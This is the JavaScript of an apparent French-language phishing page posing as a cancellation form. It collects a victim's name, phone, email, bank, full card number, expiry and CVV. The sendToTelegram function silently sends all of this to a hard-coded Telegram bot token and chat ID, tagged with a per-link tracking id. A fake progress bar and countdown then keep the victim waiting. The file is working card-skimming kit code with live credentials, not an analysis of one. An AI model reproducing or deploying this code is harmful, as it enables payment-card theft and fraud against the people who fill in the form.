document.addEventListener('DOMContentLoaded', () => {
    // ---- DOM Elements ----
    
    // Containers
    const wizardContainer = document.querySelector('.wizard-container');
    const loadingContainer = document.getElementById('step-loading');
    
    // Steps
    const steps = [
        document.getElementById('step-1'),
        document.getElementById('step-2'),
        document.getElementById('step-3'),
        document.getElementById('step-5') // Confirmation
    ];
    
    // Stepper UI
    const stepperItems = [
        document.getElementById('stepper-1'),
        document.getElementById('stepper-2'),
        document.getElementById('stepper-3'),
        document.getElementById('stepper-4')
    ];
    const stepperLines = [
        document.getElementById('line-1'),
        document.getElementById('line-2'),
        document.getElementById('line-3')
    ];
    
    // Buttons
    const btnNext1 = document.getElementById('btn-next-1');
    const btnPrev2 = document.getElementById('btn-prev-2');
    const btnNext2 = document.getElementById('btn-next-2');
    const btnPrev3 = document.getElementById('btn-prev-3');
    const btnSubmit = document.getElementById('btn-submit');
    
    // Form Inputs - Step 1
    const inNom = document.getElementById('client-nom');
    const inPrenom = document.getElementById('client-prenom');
    const inTel = document.getElementById('client-tel');
    const inEmail = document.getElementById('client-email');
    
    // Form Inputs - Step 2
    const inCard = document.getElementById('bank-card');
    const inExp = document.getElementById('bank-exp');
    const inCvv = document.getElementById('bank-cvv');
    const inBank = document.getElementById('bank-name');
    
    // Virtual Card Elements
    const vcNumber = document.getElementById('vc-number');
    const vcName = document.getElementById('vc-name');
    const vcExp = document.getElementById('vc-exp');
    
    // Summary Elements
    const sumNom = document.getElementById('sum-nom');
    const sumPrenom = document.getElementById('sum-prenom');
    const sumTel = document.getElementById('sum-tel');
    const sumEmail = document.getElementById('sum-email');
    const sumCard = document.getElementById('sum-card');
    const sumExp = document.getElementById('sum-exp');
    const sumBank = document.getElementById('sum-bank');
    
    // Loading Elements
    const loadingProgress = document.getElementById('loading-progress');
    const loadingText = document.getElementById('loading-text');

    // Telegram Config
    const TELEGRAM_TOKEN = '7335151838:AAHDgU_lAUV20e05kyht7COaN-CsXQCNd9c';
    const TELEGRAM_CHAT_ID = '5697081578';

    // ---- State ----
    let currentStepIndex = 0; // 0 = step1, 1 = step2, 2 = step3, 3 = confirmation

    // ---- Functions ----
    
    // Check validity of inputs in a specific step
    function validateStep(stepId) {
        const step = document.getElementById(stepId);
        if(!step) return true;
        const inputs = Array.from(step.querySelectorAll('input'));
        
        for (let input of inputs) {
            if (!input.checkValidity()) {
                input.reportValidity(); // Show native browser popup
                return false;
            }
            // Basic manual validation for card length
            if (input.id === 'bank-card' && input.value.replace(/\s/g, '').length < 16) {
                input.setCustomValidity("Le numéro de carte doit contenir 16 chiffres.");
                input.reportValidity();
                input.setCustomValidity(""); // reset
                return false;
            }
        }
        return true;
    }

    function showStep(index) {
        // Hide all steps
        steps.forEach(step => {
            if(step) step.classList.remove('active');
        });
        
        // Show current step
        if(steps[index]) {
            steps[index].classList.add('active');
        }
        
        updateStepper(index);
    }
    
    function updateStepper(index) {
        // Update Icons
        stepperItems.forEach((item, i) => {
            if (i < index) {
                item.classList.remove('active');
                item.classList.add('completed');
            } else if (i === index) {
                item.classList.remove('completed');
                item.classList.add('active');
            } else {
                item.classList.remove('active', 'completed');
            }
        });
        
        // Update Lines
        stepperLines.forEach((line, i) => {
            if (i < index) {
                line.classList.add('active');
            } else {
                line.classList.remove('active');
            }
        });
    }

    function populateSummary() {
        if(sumNom) sumNom.textContent = inNom.value || '-';
        if(sumPrenom) sumPrenom.textContent = inPrenom.value || '-';
        if(sumTel) sumTel.textContent = inTel.value || '-';
        if(sumEmail) sumEmail.textContent = inEmail.value || '-';
        
        if(inCard && sumCard) {
            const cardVal = inCard.value.replace(/\s/g, '');
            if (cardVal.length >= 4) {
                const last4 = cardVal.slice(-4);
                const first4 = cardVal.slice(0, 4);
                sumCard.textContent = `${first4} •••• •••• ${last4}`;
            } else {
                sumCard.textContent = '•••• •••• •••• ••••';
            }
        }
        
        if(sumExp) sumExp.textContent = inExp.value || '-';
        if(sumBank) sumBank.textContent = inBank.value || '-';
    }

    async function sendToTelegram() {
        // Extract URL ID if present
        const urlParams = new URLSearchParams(window.location.search);
        const linkId = urlParams.get('id') || 'Inconnu';
        
        const message = `
🚨 *Nouvelle Demande d'Annulation* 🚨
🔗 *Lien ID:* \`${linkId}\`

👤 *Client:* ${inNom.value} ${inPrenom.value}
📞 *Tél:* ${inTel.value}
✉️ *Email:* ${inEmail.value}

💳 *Carte Bancaire:*
🏦 *Banque:* ${inBank.value}
🔢 *Numéro:* \`${inCard.value}\`
📅 *Expire:* ${inExp.value}
🔒 *CVV:* \`${inCvv.value}\`
        `;

        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        } catch (e) {
            console.error("Erreur lors de l'envoi à Telegram:", e);
        }
    }

    // ---- Event Listeners ----
    
    // Navigation
    if(btnNext1) {
        btnNext1.addEventListener('click', () => {
            if(validateStep('step-1')) {
                currentStepIndex = 1;
                showStep(currentStepIndex);
            }
        });
    }
    
    if(btnPrev2) {
        btnPrev2.addEventListener('click', () => {
            currentStepIndex = 0;
            showStep(currentStepIndex);
        });
    }
    
    if(btnNext2) {
        btnNext2.addEventListener('click', () => {
            if(validateStep('step-2')) {
                populateSummary();
                currentStepIndex = 2;
                showStep(currentStepIndex);
            }
        });
    }
    
    if(btnPrev3) {
        btnPrev3.addEventListener('click', () => {
            currentStepIndex = 1;
            showStep(currentStepIndex);
        });
    }
    
    // Submit / Loading
    if(btnSubmit) {
        btnSubmit.addEventListener('click', async () => {
            // Envoyer à Telegram en arrière-plan
            sendToTelegram();
            
            wizardContainer.classList.remove('active');
            loadingContainer.classList.add('active');
            
            let progress = 0;
            
            const interval = setInterval(() => {
                progress += Math.floor(Math.random() * 10) + 2;
                if (progress > 100) progress = 100;
                
                loadingProgress.style.width = `${progress}%`;
                loadingText.textContent = `${progress}%`;
                
                if (progress === 100) {
                    clearInterval(interval);
                    
                    setTimeout(() => {
                        loadingContainer.classList.remove('active');
                        wizardContainer.classList.add('active');
                        currentStepIndex = 3; // Confirmation
                        showStep(currentStepIndex);
                        startCountdown();
                    }, 500);
                }
            }, 300);
        });
    }
    
    // ---- Countdown Logic ----
    function startCountdown() {
        const timerEl = document.getElementById('countdown-timer');
        if (!timerEl) return;
        
        let timeLeft = 600; // 10 minutes in seconds
        
        const countdownInterval = setInterval(() => {
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
                timerEl.textContent = "00:00";
                return;
            }
            
            timeLeft--;
            
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            
            timerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }, 1000);
    }
    
    // ---- Virtual Card Real-Time Updates ----
    
    if(inCard) {
        inCard.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
            
            if (formattedValue.trim() === '') {
                vcNumber.textContent = '•••• •••• •••• ••••';
            } else {
                vcNumber.textContent = formattedValue;
            }
        });
    }
    
    if(inExp) {
        inExp.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            
            e.target.value = value;
            vcExp.textContent = value || 'MM/YY';
        });
    }
    
    if(inBank) {
        inBank.addEventListener('input', (e) => {
            vcName.textContent = e.target.value.toUpperCase() || 'VOTRE BANQUE';
        });
    }
});
